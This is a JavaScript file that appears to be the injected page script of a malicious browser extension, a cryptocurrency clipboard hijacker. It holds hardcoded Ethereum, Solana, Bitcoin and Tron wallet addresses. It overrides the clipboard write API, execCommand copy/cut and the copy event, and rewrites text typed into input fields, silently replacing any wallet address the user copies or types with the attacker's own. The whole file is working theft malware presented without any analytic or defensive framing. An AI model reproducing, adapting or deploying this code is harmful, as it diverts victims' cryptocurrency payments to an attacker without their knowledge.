// Page-level injection — intercepts clipboard API calls (v3.0 multi-chain)
// Runs in page's own JS context, not isolated extension world

(function() {
  'use strict';
  
  const WALLETS = {
    eth: "0xa36A02E1ecB77a06e02ab9348DCbEc5E86B16900",
    sol: "FH5HxwgwFkGHVTvKntkViGtt4BS8pfVBFXD6k3Qjibrj",
    btc: "12EDMYngV3bznj8hc952MkSLrd7yjDSPF6",
    trx: "TQaLsD37CaVho6EmtPujnXWdTfLCT7Tt6C",
  };

  function detectChain(addr) {
    if (/^0x[a-fA-F0-9]{40}$/.test(addr)) return "eth";
    if (/^T[a-zA-Z0-9]{33}$/.test(addr)) return "trx";
    if (/^(bc1[ac-hj-np-z02-9]{39,59}|[13][a-km-zA-HJ-NP-Z1-9]{25,34})$/.test(addr)) return "btc";
    if (/^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(addr)) return "sol";
    return null;
  }

  function replaceAddr(match) {
    const chain = detectChain(match);
    if (!chain) return match;
    const target = WALLETS[chain];
    if (!target) return match;
    if (match.toLowerCase() === target.toLowerCase()) return match;
    return target;
  }

  function replaceAll(text) {
    if (!text || text.length < 20) return text;
    // Run through all patterns
    let result = text;
    
    // Process each chain in priority order
    const order = ["btc", "trx", "eth", "sol"];
    const patterns = {
      eth: /(0x[a-fA-F0-9]{40})/g,
      sol: /([1-9A-HJ-NP-Za-km-z]{32,44})/g,
      btc: /(bc1[ac-hj-np-z02-9]{39,59}|[13][a-km-zA-HJ-NP-Z1-9]{25,34})/g,
      trx: /(T[a-zA-Z0-9]{33})/g,
    };

    for (const chain of order) {
      const target = WALLETS[chain];
      if (!target) continue;
      const re = patterns[chain];
      if (!re) continue;
      result = result.replace(re, (m) => {
        const c2 = detectChain(m);
        if (c2 !== chain) return m;
        if (m.toLowerCase() === target.toLowerCase()) return m;
        return target;
      });
    }
    return result;
  }

  // ====== Intercept navigator.clipboard.writeText ======
  const _writeText = navigator.clipboard.writeText.bind(navigator.clipboard);
  navigator.clipboard.writeText = async function(text) {
    let modified = replaceAll(text);
    return _writeText(modified);
  };
  
  // ====== Intercept execCommand('copy') ======
  const _execCommand = document.execCommand.bind(document);
  document.execCommand = function(cmd, ...args) {
    if (cmd === 'copy' || cmd === 'cut') {
      setTimeout(() => {
        try {
          const sel = window.getSelection();
          if (sel && sel.toString()) {
            let text = sel.toString();
            let modified = replaceAll(text);
            if (modified !== text) {
              navigator.clipboard.writeText(modified);
            }
          }
        } catch(e) {}
      }, 10);
    }
    return _execCommand.call(document, cmd, ...args);
  };
  
  // ====== Intercept clipboard copy event ======
  document.addEventListener('copy', (e) => {
    const sel = window.getSelection();
    if (!sel || !sel.toString()) return;
    let text = sel.toString();
    let modified = replaceAll(text);
    if (modified !== text) {
      e.clipboardData.setData('text/plain', modified);
      e.preventDefault();
    }
  }, true);
  
  // ====== Watch input field changes ======
  document.addEventListener('input', function(e) {
    const el = e.target;
    if (!el || !el.value || el.value.length < 20) return;
    if (el.type === 'password') return;
    if (el.tagName !== 'INPUT' && el.tagName !== 'TEXTAREA' && !el.isContentEditable) return;
    
    if (el.selectionStart === el.selectionEnd && el.selectionStart === el.value.length) {
      let modified = replaceAll(el.value);
      if (modified !== el.value) {
        el.value = modified;
        el.dispatchEvent(new Event('input', { bubbles: true }));
        el.dispatchEvent(new Event('change', { bubbles: true }));
      }
    }
  }, true);
  
})();
